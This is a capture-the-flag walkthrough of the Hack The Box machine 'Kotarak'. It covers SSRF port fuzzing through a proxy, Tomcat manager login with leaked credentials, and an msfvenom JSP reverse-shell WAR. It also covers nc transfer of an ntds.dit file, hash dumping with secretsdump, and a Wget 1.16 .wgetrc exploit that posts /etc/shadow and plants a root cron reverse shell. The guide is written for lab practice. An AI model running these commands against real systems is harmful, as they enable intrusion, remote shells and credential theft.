![logo](/logo.png)

# [Kotarak- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 23 Sep 2017 machine on HTB,Kotarak created by [mrb3n](https://app.hackthebox.com/users/2984) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Tomcat
  *Wget
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/kotarak 10.10.10.55
```

###### Output 

![](/Linux/Linux-Hard/Kotarak/Screenshots/nmapi.png)

```sh
nmap -sV -sC -oA nmap/kotarak 10.10.10.55                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:18 EAT
Nmap scan report for 10.10.10.55
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5 - Error report
| http-methods: 
|_  Potentially risky methods: PUT DELETE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


looking at the results  we find out that there are 4 ports open and its a `Ubuntu`and its running an `Apache Tomcat`. 
port[22]-ssh
port[8009]-Apache Jserv
port[8080]-  Apache Tomcat 8.5.5
port[60000]-

so when we go the browser at [http://10.10.10.55:8080](http://10.10.10.55:8080)  looking at this i find nothing of interesting as it shows nothing only the status error code.

![](/Linux/Linux-Hard/Kotarak/Screenshots/nmap.png)

so i decide to use the other port `60000` [http://10.10.10.55:60000](http://10.10.10.55:60000)  

![](/Linux/Linux-Hard/Kotarak/Screenshots/proxy.png)

 Looking at the web server on port 60000 reveals a rudimentary proxy, when i click subit it just shows this url http://10.10.10.55:60000/url.php?path=  lets fuzz the url to see if we can be able to achieve any local services
 
```sh
wfuzz -c -z range,1-65635 --hl=2 http://10.10.10.55:60000/url.php?path=127.0.0.1:FUZZ 
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/wfuzz.png)

Browsing to 127.0.0.1:888 reveals a directory listing.

![](/Linux/Linux-Hard/Kotarak/Screenshots/directorylisting.png)

looking at the page seems blank even the page source 

![](/Linux/Linux-Hard/Kotarak/Screenshots/blank.png)

so after adding like this http://10.10.10.55:60000/url.php?path=127.0.0.1:888?doc=backup  it shows a page sources with apache Tomcat credentials.

![](/Linux/Linux-Hard/Kotarak/Screenshots/tomcat.png)

The admin user in the backup file has access to `manager` and `manager-gui`, so I’ll try visiting (http://10.10.10.55:8080/manager/html) again, and entering the creds lets me in

![](/Linux/Linux-Hard/Kotarak/Screenshots/apache.png)

Once logged into the manager, it is trivial to obtain a shell. 

```sh
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.15 lport=1337 -f war > leshack.war
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/msfvenom.png)

so i upload the .war file 

![](/Linux/Linux-Hard/Kotarak/Screenshots/war.png)

Then I click the file from here 

![](/Linux/Linux-Hard/Kotarak/Screenshots/warfile.png)

Then i get the shell

![](Linux/Linux-Hard/Kotarak/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```


![](/Linux/Linux-Hard/Kotarak/Screenshots/stty.png)

looking at the home directory for the user flag i find that the it can not be accessded 

![](/Linux/Linux-Hard/Kotarak/Screenshots/atanas.png)

looking a tomacat directories in pentest_data i seem to find the two files.The `.bin` reports to be a Windows registry file, where as `file` doesn’t recognize the `.dit` as anything more than data. lets transfer them to my local machine and be able to explore them.

![](/Linux/Linux-Hard/Kotarak/Screenshots/pentest_data.png)

we  do this in the kotark machine

```sh
nc 10.10.14.15 9000 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
```

and this in our localhost machine

```sh
nc -nvlp 9000 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
```

`impacket-secretsdump` will extract all the hashes from an `ntds.dit` file using the SYSTEM reg hive to decrypt:

```sh
impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin LOCAL | tee secrethashes
```


![](/Linux/Linux-Hard/Kotarak/Screenshots/hashes.png)

I’ve used `tee` to write the output to a file so I can easily grab the NTLM hashes from the output:

```sh
 cat secrethashes | grep ":::" | cut -d: -f4
```

I can run these through `hashcat`, but as NTLM hashes aren’t salted per user, any word I would check without some customization to the target has already been calculated by sites like [crackstation.net](https://crackstation.net/). Three of the passwords break

![](/Linux/Linux-Hard/Kotarak/Screenshots/crackstation.png)

The empty password isn’t too useful, but I’ll note the other two. `Password123!` is associated with the administrator user in this dump, and `f16tomcat!` is associated with the atanas account.

atanas doesn’t have permissions to SSH using a password, but this password will work with `su` from the local shell as tomcat

![](/Linux/Linux-Hard/Kotarak/Screenshots/atanask.png)

atanas has permission to read `user.txt`:

![](/Linux/Linux-Hard/Kotarak/Screenshots/userflag.png)

Unlike most HTB machines, as this user I can enter and list files in `/root`:

![](/Linux/Linux-Hard/Kotarak/Screenshots/ls.png)

In fact, not only can I list the files, but read both `flag.txt` and `app.log`. `flag.txt` is a hint to continue looking:

![](/Linux/Linux-Hard/Kotarak/Screenshots/applog.png)

The log shows that Wget verson 1.16 is run every two minutes . Looking at the network configuration reveals that the request came from the local machine, so it is safe to assume that Wget is being run as root.

Using `authbind`, it is possible to run the exploit script on the target and listen on port 80 

There are many ways to exploit this vulnerability. I could drop a `.bashrc` file and wait for someone to start a shell. If I thought perhaps the `wget` was being run from a web directory, I could look at uploading a webshell.

There’s a proof of concept for this CVE on [exploitdb](https://www.exploit-db.com/exploits/40064). It’s strategy is to write a Wget Startup file. Based on the [priority](https://www.gnu.org/software/wget/manual/html_node/Wgetrc-Location.html) `wget` looks for these files, as long as there’s nothing in the `/usr/local/etc/wgetrc` and the env variable `WGETRC` isn’t set, it will try to load from `$HOME/.wgetrc`.

This fill will set arguments for `wget` that aren’t passed on the command line. The POC uses two of these with the following `.wgetrc` file:

```sh
cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/server.png)

And start a Python FTP server:

```sh
authbind python -m pyftpdlib -p21 -w
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/exploitexec.png)

let me start another shell from the tomcat so that i can use it to run the exploit using just using the same code and exploit and listenning to the same port number i get the shell

![](/Linux/Linux-Hard/Kotarak/Screenshots/target.png)

I’ll save a copy of the Python POC locally and make a few edits. It’s got `go_GET` and a `do_POST` methods to handle incoming requests. It assumed the first request will be a GET, and will redirect that to get the `.wgetrc`. Then the next request will be a POST if that worked, and that’s where it returns the `cron` file. Those functions are fine. There’s some configuration at the bottom that needs updating

The HTTP listen needs to be on the IP that the container is connecting to.

```sh
authbind nc -lnvp 80
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/authbans.png)

exploit should be ike this

![](/Linux/Linux-Hard/Kotarak/Screenshots/exploit.png)


Now the `cron` will result in a reverse shell. With a Python webserver in my VM, I’ll grab it with `wget`:

```sh
wget http://10.10.14.15:8000/wgetExploit.py
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/wget.png)

Now run it with `authbind`, and it checks that the FTP server is good, and then waits:

```sh
authbind python wgetExploit.py
```

![](/Linux/Linux-Hard/Kotarak/Screenshots/poc.png)


The `shadow` file doesn’t have anything that useful in it. But hopefully this indicates that the `cron` was written. One minute later:

![](/Linux/Linux-Hard/Kotarak/Screenshots/root.png)


This shell on the on host kotarak-int, and it has landed me as root. I can read `root.txt`:

![](/Linux/Linux-Hard/Kotarak/Screenshots/rootflag.png)


	-------------------------END successful attack @lesley----------------------

